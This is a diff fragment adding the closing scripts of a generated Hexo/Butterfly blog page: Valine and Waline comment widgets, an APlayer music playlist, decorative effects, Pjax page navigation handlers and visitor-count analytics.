+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: true
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadWaline () {
+  function initWaline () {
+    const waline = new Waline(Object.assign({
+      el: '#waline-wrap',
+      serverURL: 'https://waline2-five.vercel.app/',
+      avatar: 'identicon',
+      path: location.pathname,
+      emojiCDN: '',
+      emojiMaps: "",
+      visitor: true
+    }, {"pageSize":10,"placeholder":"随便留下点什么吧~","langMode":{"admin":"博主","nick":"xiaoyao"}}))
+  }
+
+  if (typeof Waline === 'function') initWaline() 
+  else getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js').then(initWaline)
+}
+
+if ('Valine' === 'Waline' || !true) {
+  if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+  else setTimeout(loadWaline, 0)
+} else {
+  function loadOtherComment () {
+    loadWaline()
+  }
+}</script></div><div class="aplayer no-destroy" data-id="7988378536" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-autoplay="true" data-theme="#408fda" data-order="random" data-preload="auto" data-mutex="true" muted></div><script type="text/javascript" src="/js/myjs.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener toc scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
